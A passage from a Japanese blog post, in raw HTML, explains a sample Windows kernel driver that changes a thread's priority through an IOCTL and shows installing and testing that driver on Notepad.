	&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Priority &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Priority &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; STATUS_INVALID_PARAMETER&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

	PETHREAD Thread&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;PsLookupThreadByThreadId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;ULongToHandle&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;ThreadId&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;Thread&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;NT_SUCCESS&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;status&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;token function&quot;&gt;KeSetPriorityThread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PKTHREAD&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;Thread&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Priority&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;ObDereferenceObject&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Thread&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;KdPrint&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Thread Priority change for %d to %d succeeded!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
		data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;ThreadId&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Priority&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;IOCTL_SECOND_DRIVER_SET_PRIORITY&lt;/code&gt;は以下ように定義しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;IOCTL_SECOND_DRIVER_SET_PRIORITY&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token function&quot;&gt;CTL_CODE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;SECOND_DRIVER_DEVICE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x800&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; METHOD_NEITHER&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; FILE_ANY_ACCESS&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;CTL_CODE&lt;/code&gt;マクロは、引数の情報を元に制御コードのオブジェクトを生成します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;CTL_CODE macro (d4drvif.h) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;受け渡された制御コードが&lt;code class=&quot;language-text&quot;&gt;IOCTL_SECOND_DRIVER_SET_PRIORITY&lt;/code&gt;の場合、処理を実行します。&lt;/p&gt;
&lt;p&gt;以下は入力値チェックを行っています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// do the work&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;stack&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Parameters&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;DeviceIoControl&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;InputBufferLength &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ThreadData&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; STATUS_BUFFER_TOO_SMALL&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;auto&lt;/span&gt; data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ThreadData&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;stack&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Parameters&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;DeviceIoControl&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Type3InputBuffer&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; nullptr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; STATUS_INVALID_PARAMETER&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Priority &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Priority &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; STATUS_INVALID_PARAMETER&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;今回は最終的にスレッドの優先順位を設定するため、受け渡されたバッファに&lt;code class=&quot;language-text&quot;&gt;ThreadData&lt;/code&gt;を格納する必要があります。&lt;/p&gt;
&lt;p&gt;そのため、&lt;code class=&quot;language-text&quot;&gt;stack-&gt;Parameters.DeviceIoControl.InputBufferLength&lt;/code&gt;のサイズの確認を行っています。&lt;/p&gt;
&lt;p&gt;サイズ確認後、&lt;code class=&quot;language-text&quot;&gt;(ThreadData*)stack-&gt;Parameters.DeviceIoControl.Type3InputBuffer&lt;/code&gt;にてスタックロケーションのバッファを&lt;code class=&quot;language-text&quot;&gt;ThreadData&lt;/code&gt;にキャストします。&lt;/p&gt;
&lt;p&gt;ヌルポインタになった場合はエラーを返します。&lt;/p&gt;
&lt;p&gt;最後に、&lt;code class=&quot;language-text&quot;&gt;ThreadData&lt;/code&gt;の&lt;code class=&quot;language-text&quot;&gt;Priority&lt;/code&gt;の値が規定の範囲に収まっているかを確認します。&lt;/p&gt;
&lt;p&gt;受け渡されたデータのチェックが完了したら、&lt;code class=&quot;language-text&quot;&gt;KeSetPriorityThread&lt;/code&gt;関数でスレッドの優先順位を設定します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;KeSetPriorityThread&lt;/code&gt;関数は、第1引数に優先順位を設定するスレッドのポインタを受け取る必要があります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-kesetprioritythread&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;KeSetPriorityThread function (wdm.h) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;そのため、&lt;code class=&quot;language-text&quot;&gt;PsLookupThreadByThreadId&lt;/code&gt;関数を用いて、受け渡されたスレッドIDからスレッドオブジェクトのポインタを取得します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-pslookupthreadbythreadid&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;PsLookupThreadByThreadId function (ntifs.h) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;PsLookupThreadByThreadId&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;ntifs.h&lt;/code&gt;をインクルードすることで使用可能です。&lt;/p&gt;
&lt;p&gt;コンパイルエラーを回避するため、&lt;code class=&quot;language-text&quot;&gt;ntifs.h&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;ntddk.h&lt;/code&gt;より前にインクルードする必要があります。&lt;/p&gt;
&lt;p&gt;コードを見てみます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;PETHREAD Thread&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;PsLookupThreadByThreadId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;ULongToHandle&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;ThreadId&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;Thread&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;NT_SUCCESS&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;status&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token function&quot;&gt;KeSetPriorityThread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PKTHREAD&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;Thread&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Priority&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;ObDereferenceObject&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Thread&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;KdPrint&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Thread Priority change for %d to %d succeeded!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;ThreadId&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; data&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;Priority
    &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;優先順位をセットした後に&lt;code class=&quot;language-text&quot;&gt;ObDereferenceObject&lt;/code&gt;マクロを呼び出しています。&lt;/p&gt;
&lt;p&gt;このマクロは引数で受け取ったオブジェクトの参照カウントをデクリメントするマクロですが、用途がいまいちよくわかりませんでした。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obdereferenceobject&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ObDereferenceObject macro (wdm.h) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参照カウントとは、そのオブジェクトへの参照もしくはポインタがシステム内にいくつ存在しているかをカウントするもののようです。&lt;/p&gt;
&lt;p&gt;この参照カウントが0であれば、システム(たぶんGCなど)によって破棄することが許可されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ja.wikipedia.org/wiki/%E5%8F%82%E7%85%A7%E3%82%AB%E3%82%A6%E3%83%B3%E3%83%88&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;参照カウント - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ここで&lt;code class=&quot;language-text&quot;&gt;ObDereferenceObject&lt;/code&gt;による参照カウントのデクリメントを行うのは、システムのリークを防ぐためです。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;PsLookupThreadByThreadId&lt;/code&gt;は、受け取ったスレッドに対しての参照カウントをインクリメントします。&lt;/p&gt;
&lt;p&gt;そのため、終了時までに&lt;code class=&quot;language-text&quot;&gt;ObDereferenceObject&lt;/code&gt;によってデクリメントを行わないと参照カウントが増加したままになり、リークが発生します。&lt;/p&gt;
&lt;p&gt;これでカーネルドライバ側の実装を一通り追うことができました。&lt;/p&gt;
&lt;p&gt;クライアントの実装についてはこの記事では割愛します。&lt;/p&gt;
&lt;p&gt;詳しくやりたい方は&lt;a href=&quot;https://amzn.to/3H3WMoe&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windowsカーネルドライバプログラミング&lt;/a&gt;をご購入ください。&lt;/p&gt;
&lt;h2 id=&quot;ドライバのインストール&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB&quot; aria-label=&quot;ドライバのインストール permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ドライバのインストール&lt;/h2&gt;
&lt;p&gt;前の記事と同様の手順で、作成したドライバをシステムにインストールします。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;sc&lt;/span&gt; create second &lt;span class=&quot;token function&quot;&gt;type&lt;/span&gt;= kernel binPath= C:\Driver\SecondDriver\SecondDriver&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sys
&lt;span class=&quot;token namespace&quot;&gt;[SC]&lt;/span&gt; CreateService SUCCESS

$ &lt;span class=&quot;token function&quot;&gt;sc&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt; second
SERVICE_NAME: second
        &lt;span class=&quot;token function&quot;&gt;TYPE&lt;/span&gt;               : 1  KERNEL_DRIVER
        STATE              : 4  RUNNING
                                &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;STOPPABLE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; NOT_PAUSABLE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; IGNORES_SHUTDOWN&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        WIN32_EXIT_CODE    : 0  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0x0&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        SERVICE_EXIT_CODE  : 0  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0x0&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 0
        FLAGS              :&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;このあと&lt;code class=&quot;language-text&quot;&gt;WinObj&lt;/code&gt;の&lt;code class=&quot;language-text&quot;&gt;GLOBAL??&lt;/code&gt;を確認すると、作成した&lt;code class=&quot;language-text&quot;&gt;SecondDriver&lt;/code&gt;のシンボリックリンクが存在していることが確認できます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/11cd136e5be9b88c1e7f11fa9ff10614/0b533/image-21.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 74.16666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAACJUlEQVQ4y5WUCY+iQBCF+f9/bbJHdjMqKF4Icsh9CYpv69XYhtlsJtlOKqSb5utXr6qx4qxC29So6xpN06CqZN52mKYJ9/sdt9vty+A+Mx6PByw3OCMrY6TpBVmawfd9hOcQQRAgiuLXQX8HD87zAlmWKXgYBhEwweqrPdJ4h7rp9GUcxxoEt22L67VH13X/DL7fbDbY7/a4XC6q0hrbAIf1G4qyVZVU1IoCquUBZVliHEdVMA+ztt1uFfoC3roA3vYHmnbQE5nOcL0KLFelBNNLBj0y3hp/CfNPvqSfywEjrGmIsHPeEMWZwqgoFxjhxmgGAX3fq7L5muu6EhuEUaRz636VAhx+I0kKSbdCJcC6+ijEVZRSET+mmrIo9UCzRgAVLpdLJCble3/WlPO8ViBBVBGGkao0agjJ0lRTI4iDT8dxsFgsECfJsyidj6P7XWC9wGoURaEgFsb0mAHO4SbWzvpDYfJUOEiV/cMv5EUj/XeWlCR16bFIFLIPz7LGnqRqAzeDQHrItHMRosBpGjEOvU7YMpX4p+mwWcVDFoLxUvh8mmqzbdabNTKxQoGYDXY/of8zCKTKSKrMLCzji1HIBu26VuHzaORdnJVwjiHcIFUrPM+Dbds47Pd6W+i/NfeFFV6tVtjLBvoWhuGn8OWOv9sbfPv5Lqq2uo/A0+mkQlThHMj7aduO3JDkedk//224ryxyrGVPXTf6DVU6MveOngL/AA+cfmoXU3IpAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/11cd136e5be9b88c1e7f11fa9ff10614/8ac56/image-21.webp 240w,
/static/11cd136e5be9b88c1e7f11fa9ff10614/d3be9/image-21.webp 480w,
/static/11cd136e5be9b88c1e7f11fa9ff10614/b0a15/image-21.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/11cd136e5be9b88c1e7f11fa9ff10614/8ff5a/image-21.png 240w,
/static/11cd136e5be9b88c1e7f11fa9ff10614/e85cb/image-21.png 480w,
/static/11cd136e5be9b88c1e7f11fa9ff10614/0b533/image-21.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/11cd136e5be9b88c1e7f11fa9ff10614/0b533/image-21.png&quot;
            alt=&quot;image-21.png&quot;
            title=&quot;image-21.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ドライバがインストールできたので、クライアントアプリケーションを使ってスレッドの優先順位を設定してみます。&lt;/p&gt;
&lt;p&gt;今回は検証のためにメモ帳アプリのスレッドを操作することにしました。&lt;/p&gt;
&lt;p&gt;Proexpから、メモ帳のスレッドの優先順位が10に設定されていることがわかります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 554px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/87f9871280c443cd79688290c6f4679e/04abd/image-22.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 115.00000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAXCAYAAAALHW+jAAAACXBIWXMAAAsTAAALEwEAmpwYAAAD/0lEQVQ4y51VWW8bVRSev4yExBu8wBu80AfUNwQPPLRpgUqJEzduHbUpjp3W9tgzXmbfN8/qNfb449wxCUGtIOLI13eZud/5zjrcelei2+5hePQU0vExgqkEfzKBrSowHBO+Z0BXJ3AsDas8Qeg5SFwHqa7DGA5hj0Zwx2N4kgTp8hLchgCHXR6jkxeQ6mcIoxlM14XregiCEJblwDJtFPMFFssV4iRBmuVI8wLbskRO5wHdYcQsIsKttzsIoym06w6mVy1kcYzRaAyTgNjFducaE0mG6/no80NMyAJBHKHVakNRNdi2g3a7A1UzYCsKOCeM0TlvYFKvQW82MScGyyLFfrMAsAUtaN4BJc3bJa33f+9vVof1dl2dK4MBuClpcS0Tq8WiYhfMErT1Ag0xRI33cdL38OK9hedXGl5PM/zWMfDsSkWNzpuij9MPOi7lBCN/BZ98yw2nUzJBhGXbiKIQUZLjlz8M/PjWwK/iAkd8jqNBgWc07tbDAk/7GX6o8fj+9w4eHffRGEWIAg+cTY4XKVKGYVAQAhR5TuyZqTf4LynJLdtljnI9J8tv4DjEUJRl6KaJzXaLxeoQxf2tp8r9v477sqMo2wxQljWofR4JMVxSJLM0w57e3dPf7bgvt/t/PKex3e0QMMCmIeIRsfwpmeHnOIJHDKsL+BjsU1KBVvaX6FgWuCfda3x20sXndQFfnAuwKI3uM3gIYLk/OOl8IIOT7BRvzmS06z4+NGeYRelfL+LBgKh+JaYimRyEFlrvFdQaFuqvTEqd7CMfPWSQzRgKZHIYBaidXuDJ8z5qZyrCMMX/lcHAoNKLU5y+fId6vYWLix4xjLHZbLBar7GlOmfr9XpDabEjv5fVXBQFZrMZzXPklLcRNYcVpZw4Ih8W8zmSNEaWJZSYFmIqP03TqXKcSmuWZXBovSYFaZpiSd0ljiKMqboC34dNOczzlHaUHTZVG+d5HhZUx4yJROnj096y7OqMCZtVRYVGNT+hvucQm3CxREyMdofWcCesfLlut1shM3MUaj8+aTVNi4D9O0BF